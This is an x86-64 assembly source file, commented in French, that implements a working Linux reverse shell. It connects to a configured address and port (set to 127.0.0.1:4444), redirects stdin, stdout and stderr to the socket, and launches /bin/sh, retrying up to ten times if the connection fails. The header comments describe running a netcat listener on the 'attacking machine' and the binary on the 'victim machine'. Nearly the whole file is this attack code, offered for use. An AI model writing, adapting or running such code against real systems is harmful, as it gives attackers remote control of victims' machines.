; reverse_shell.asm
; Reverse shell en assembleur x86-64
; 
; Compilation:
; nasm -f elf64 -o reverse_shell.o reverse_shell.asm
; ld -o reverse_shell reverse_shell.o
;
; Utilisation:
; Sur la machine attaquante: nc -lvp 4444
; Sur la machine victime: ./reverse_shell

section .data
    ; Constantes pour les appels sys
    SYS_SOCKET equ 41
    SYS_CONNECT equ 42
    SYS_DUP2 equ 33
    SYS_EXECVE equ 59
    SYS_EXIT equ 60
    SYS_CLOSE equ 3
    SYS_NANOSLEEP equ 35
    ; Constantes pour socket
    AF_INET equ 2
    SOCK_STREAM equ 1
    IPPROTO_IP equ 0

    ; Config de la connexion
    ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
    port dw 0x5c11         ; Port 4444 (0x115c)

    ; Constantes pour retry
    MAX_RETRY equ 10       ; Nombre max de tentatives
    ; Structure timespec pour nanosleep
    timespec:
        tv_sec  dq 5       ; 5 sec
        tv_nsec dq 0
    ; path pour shell
    shell db "/bin/sh", 0
    shell_argv:
        .argv0 dq shell
        .argv1 dq 0
    shell_envp:
        .envp0 dq 0

section .bss
    sockfd resq 1
    sockaddr_in resb 16 ; Struct pour stocker l'IP de connexion
    retry_count resq 1     ; Compteur de tentatives de connexion

section .text
    global _start

_start:
    xor rax, rax
    mov [retry_count], rax

try_connect:
    ; Étape 1: Création du socket
    mov rax, SYS_SOCKET
    mov rdi, AF_INET       ; Famille d'adresses
    mov rsi, SOCK_STREAM   ; Type de socket
    mov rdx, IPPROTO_IP    ; Protocole
    syscall
    
    ; Vérification d'erreur
    test rax, rax
    js socket_error
    
    ; Sauvegarde du descripteur de socket
    mov [sockfd], rax
    mov word [sockaddr_in], AF_INET
    mov ax, [port]
    mov [sockaddr_in + 2], ax
    mov eax, [ip]
    mov [sockaddr_in + 4], eax

    xor rax, rax                       ; Remplir le reste avec des zéros
    mov qword [sockaddr_in + 8], rax

    mov rax, SYS_CONNECT               ; connexion au serv
    mov rdi, [sockfd]                  ; descripteur de socket
    mov rsi, sockaddr_in               ; adresse de connexion
    mov rdx, 16                        ; taille structure
    syscall
    test rax, rax
    js connect_error

    ; la connexion est établie
    ; redirection des flux et exec du shell
    ; Boucle pour rediriger STDIN, STDOUT, STDERR (0, 1, 2)
    xor rsi, rsi                   ; Commencer par le descripteur 0 (STDIN)

dup_loop:
    mov rax, SYS_DUP2
    mov rdi, [sockfd]              ; descripteur de socket
    syscall                        ; rsi contient déjà le descripteur cible
    
    inc rsi                        ; descripteur suivant
    cmp rsi, 3                     ; 3 descripteurs
    jl dup_loop                    ; Si non, continuer

    ; Maintenant que les flux sont redirigés, on passe à l'exécution du shell

    ; exec du shell
    mov rax, SYS_EXECVE
    lea rdi, [shell]               ; chemin vers /bin/sh
    lea rsi, [shell_argv]          ; tableau d'arguments
    lea rdx, [shell_envp]          ; tableau de variables d'environnement
    syscall

    ; Error handling, si connexion à échouée 
    mov rax, SYS_CLOSE
    mov rdi, [sockfd]
    syscall
    jmp exit
    
socket_error:
    inc qword [retry_count]
    jmp retry_logic
    
connect_error:
    ; On ferme le socket
    mov rax, SYS_CLOSE
    mov rdi, [sockfd]
    syscall
    inc qword [retry_count]

retry_logic:
    mov rax, [retry_count]
    cmp rax, MAX_RETRY
    jge exit               ; Si on a atteint le nombre max de tentatives, on sort

    mov rax, SYS_NANOSLEEP
    lea rdi, [timespec]    ; Structure timespec
    xor rsi, rsi           ; Pas besoin de timespec restant
    syscall

    ; retry, entre dans la boucle
    jmp try_connect

exit:
    ; END
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall
